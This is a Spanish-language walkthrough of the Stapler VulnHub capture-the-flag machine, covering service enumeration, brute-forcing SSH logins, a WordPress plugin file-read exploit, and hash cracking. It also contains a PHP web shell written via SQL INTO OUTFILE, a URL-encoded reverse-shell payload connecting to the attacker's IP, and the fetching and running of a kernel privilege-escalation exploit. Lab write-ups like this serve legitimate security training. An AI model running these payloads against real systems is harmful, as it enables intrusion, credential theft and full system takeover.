# STAPLER
Desarrollo del CTF STAPLER
Download: https://www.vulnhub.com/entry/stapler-1,150/

# Importante
Al descargar la VM e intentar utilizarla con VMWARE WORKSTATION 16 no funcionó (nunca super el motivo). La abrí con VIRTUALBOX y la exporte a un OVA para poder abrirlo con VMWARE.

## Escaneo de Puertos

### 1. Escaneamos todos los puertos TCP

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 192.168.78.140
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.78.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 8
|   Capabilities flags: 63487
|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, ODBCClient, LongColumnFlag, Support41Auth, IgnoreSigpipes, SupportsCompression, SupportsTransactions, FoundRows, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsLoadDataLocal, LongPassword, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: gbz4\x0FZ\x10\x7Fes\x1D\x19<{@\x1C	\x15	\x06
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:5F:C6:18 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2021-02-23T16:39:50+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-23T16:39:49
|_  start_date: N/A
```

## Explotando Vulnerabilidades: Método 01 (propio)

Esta VM tiene mucho métodos para explotar, primero explicaré el que yo utilicé y luego los siguientes son métodos que luego leí de resolución.

### 1. Enumerar toda la información posible en cada servicio.

#### Puerto TCP/21 FTP
```
* El escaneo con NMAP indica que tenemos acceso anónimo
* Dentro hay un archivo llamado "note", toca revisar el mensaje.
root@kali:~/STAPLER# ftp 192.168.78.140
Connected to 192.168.78.140.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.78.140:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler1.jpg" width="80%"></img>

Importante: En el archivo no hay nada importante, aunque encontramos 02 nombres: Elly, John.

#### Puerto TCP/139 NETBIOS
```
Utilizamos la herramienta ENUM4LINUX: https://tools.kali.org/information-gathering/enum4linux
Debido a que el resultado es muy largo, sólo colocaré el resultado mas importante

root@kali:~/STAPLER# enum4linux -a 192.168.78.140 > enum4linux.txt
[+] Attempting to map shares on 192.168.78.140
//192.168.78.140/print$	Mapping: DENIED, Listing: N/A
//192.168.78.140/kathy	Mapping: OK, Listing: OK
//192.168.78.140/tmp	Mapping: OK, Listing: OK
//192.168.78.140/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler2.jpg" width="80%"></img>


### 2. Cracking ONLINE: ataque de diccionario

Utilizamos todos los usuarios que hemos identificado para tratar de acceder por FTP, SSH y MYSQL.
Yo siempre pruebo usuario = contraseña.
```
hydra -t 4 -L ntbusers.txt -P ntbusers.txt ftp://192.168.78.140
hydra -t 4 -L ntbusers.txt -P ntbusers.txt ssh://192.168.78.140
```
Importante: Luego aprendí que con la opción "-e" se puede hacer esto: -e nsr  try "n" null password, "s" login as pass and/or "r" reversed login

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler3.jpg" width="80%"></img>

Ganamos acceso a través de SSH con el usuario: SHayslett

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler4.jpg" width="80%"></img>


### 3. Elevar privilegios
1. Leemos archivos importantes dentro del directorio /home/. He leido todos los archivos BASH_HISTORY y notamos dos cosas:
- Tenemos acceso a los archivos de todos los usuarios, menos del usuario "peter"
- El archivo bash_history del usuario JKNODE tiene el passwrd del usuario "peter"

```
SHayslett@red:/home$ grep -rin . | grep bash_history
peter/.viminfo: Permission denied
grep: peter/.bash_history: Permission denied
grep: peter/.cache: Permission denied
SHayslett/.bash_history:1:exit
JKanode/.bash_history:1:id
JKanode/.bash_history:2:whoami
JKanode/.bash_history:3:ls -lah
JKanode/.bash_history:4:pwd
JKanode/.bash_history:5:ps aux
JKanode/.bash_history:6:sshpass -p thisimypassword ssh JKanode@localhost
JKanode/.bash_history:7:apt-get install sshpass
JKanode/.bash_history:8:sshpass -p JZQuyIN5 peter@localhost
JKanode/.bash_history:9:ps -ef
JKanode/.bash_history:10:top
JKanode/.bash_history:11:kill -9 3747
JKanode/.bash_history:12:exit
JKanode/.bash_history:13:ls
JKanode/.bash_history:14:ls -la
JKanode/.bash_history:15:ssh peter@localhost
JKanode/.bash_history:16:ls
JKanode/.bash_history:17:exi
JKanode/.bash_history:18:exit
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler5.jpg" width="80%"></img>

2. Ingresamos con el usuario PETER.

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler6.jpg" width="80%"></img>

3. Elevamos privilegios a través de SUDO. El usuario tiene privilegios de root sin credenciales. 

```
red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
```
4. Ganamos acceso como root.

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler7.jpg" width="80%"></img>

## Explotando Vulnerabilidades: Método 02 (a través de WORDPRESS)

### 1. Enumerar toda la información de los servicios HTTP
En el puerto TCP/80 tenemos dos archivos. No lo encontré con el GOBUSTER pero si con NIKTO. Nada importante.

```
root@kali:~/STAPLER# nikto -h http://192.168.78.140
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.78.140
+ Target Hostname:    192.168.78.140
+ Target Port:        80
+ Start Time:         2021-02-23 19:12:35 (GMT-5)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
+ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
+ End Time:           2021-02-23 19:12:50 (GMT-5) (15 seconds)
---------------------------------------------------------------------------
```

En el puerto TCP/12380 encontramos cosas importantes:
- Funciona a través de SSL (cosa muy rara, es decir, muestra resultado por HTTP y también por HTTPs, cosas que solo pasan en CTFs)
- Hay 03 carpetas: /admin112233/, /blogblog/ y /phpmyadmin/

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler8.jpg" width="80%"></img>

### 2. Enumeramos usuarios del Wordpress y buscamos vulnerabilidades
En la carpeta /blogblog/ tenemos un WORDPRESS y toca buscarles vulnerabilidades.
```
wpscan --api-token API_KEY --url=https://192.168.78.140:12380/blogblog/ --disable-tls-checks -e ap,u --plugins-detection aggressive  > wpscan1.txt
```
El resultado muestra lo siguiente:
- Múltiples vulnerabilidades en el core de Wordpress: XSS y SQLi (es una opción explotar el SQLi).
- 04 plugins: advanced-video-embed, akismet, shortcode-ui, two-factor. Al parecer ninguno tiene alguna vulnerabilidad importante.
- Enumeración de archivos y carpetas: https://192.168.78.140:12380/blogblog/wp-content
- Enumeramos usuarios: elly, peter, john, barry, heather, garry, harry, scott, kathy, tim.

### 3. Explotamos alguna vulnerabilidad de Wordpress.
- Una opción es probar usuarios y contraseñas, al igual que lo hicimos en el Método 01.
- Otra opción es buscar archivos importantes en las carpetas. Vamos por este.

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler9.jpg" width="80%"></img>

-  Vamos aprovechar una vulnerabilidad en el PLUGIN "advanced-video-embed". En lo personal no se me hubiera ocurrido buscar una vulnerabilidad aqui porque el WPSCAN no indica nada al respecto, sin embargo, Google si indica una vulnerabilidad en la versión 01 del plugin. 
Moraleja: Nunca confiarse de las tools, siempre buscar manualmente.

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler10.jpg" width="80%"></img>

- En exploit-db encontramos una POC sobre la vulnerabilidad: https://www.exploit-db.com/exploits/39646 (toca leer y documentarse sobre la vulnerabilidad).
- La vulnerabilidad lee un archivo que le pasamos en el parámetro THUMB y luego lo coloca como imagen (toca leer el script de la POC).
```
https://192.168.78.140:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=110000000000000000L&short=1&term=1&thumb=../wp-config.php
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler11.jpg" width="80%"></img>

- Descargamos el archivo y lo analizamos. Encontramos el acceso a  mysql.
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler12.jpg" width="80%"></img>
```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');
/** MySQL database username */
define('DB_USER', 'root');
/** MySQL database password */
define('DB_PASSWORD', 'plbkac');
/** MySQL hostname */
define('DB_HOST', 'localhost');
/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');
/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

### 4. Ingresamos a la Base de Datos MYSQL
- Listamos los usuarios de la BD Wordpress.
```
1	John	$P$B7889EMq/erHIuZapMB8GEizebcIy9.	john
2	Elly	$P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0	elly
3	Peter	$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0	peter
4	barry	$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0	barry
5	heather	$P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10	heather
6	garry	$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1	garry
7	harry	$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0	harry
8	scott	$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1	scott
9	kathy	$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0	kathy
10	tim	$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0	tim
11	ZOE	$P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1	zoe
12	Dave	$P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy.	dave
13	Simon	$P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0	simon
14	Abby	$P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.	abby
15	Vicki	$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131	vicki
16	Pam	$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0	pam
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler13.jpg" width="80%"></img>

- CRACKING hash WORDPRESS
```
hashcat -m 400 -a 0 -o cracking.txt wordpresshash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 400 -a 0 -o cracking.txt wordpresshash.txt wordpressusers.txt

root@kali:~/STAPLER# cat cracking.txt 
$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1:football
$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1:cookie
$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0:monkey
$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0:coolgirl
$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0:washere
$P$B7889EMq/erHIuZapMB8GEizebcIy9.:incorrect
$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0:thumb
$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0:0520
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler14.jpg" width="80%"></img>

- El hash: $P$B7889EMq/erHIuZapMB8GEizebcIy9 corresponde al usuario "john. Este usuario tiene altos privilegios en Wordpress.

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler15.jpg" width="80%"></img>


### 5. Upload a webshell
Tenemos dos (02) maneras de subir un webshell:

1. A través de PHPMYADMIN y sentencias SQL. La ruta /var/www/https/ debe ser adivinada (no es una ruta comun).
```
SELECT "<?php phpinfo(); ?>" INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/test.php' 
```

2. Cargamos un webshell para obtener conexión reversa:
```
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/cmd.php' 
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler16.jpg" width="80%"></img>

3. Ejecutamos una shell reversa:
```
https://192.168.78.140:12380/blogblog/wp-content/uploads/cmd.php?cmd=php%20-r%20%27$sock=fsockopen(%22192.168.78.131%22,159);$proc=proc_open(%22/bin/sh%20-i%22,%20array(0=%3E$sock,%201=%3E$sock,%202=%3E$sock),$pipes);%27
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler17.jpg" width="80%"></img>


### 6. Elevamos privilegios
- Podemos aplicar la técnica anterior de buscar archivos interesantes como en el Método 01, sin embargo, vamos a utilizar otra.
- Vamos a buscar un exploit para escalar privilegios. Ensayo y error con los exploits.

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler18.jpg" width="80%"></img>

- Descargamos y descomprimimos los archivos:
```
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
www-data@red:/tmp$ mkdir 39772
www-data@red:/tmp$ cp 39772.zip 39772
www-data@red:/tmp/39772$ unzip -e 39772.zip
www-data@red:/tmp/39772$ cd 39772
www-data@red:/tmp/39772/39772$ tar -xvf exploit.tar
<72/ebpf_mapfd_doubleput_exploit$ chmod +x compile.sh                        
www-data@red:/tmp/39772/39772/ebpf_mapfd_doubleput_exploit$ chmod +x doubleput
./doubleput
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler19.jpg" width="80%"></img>


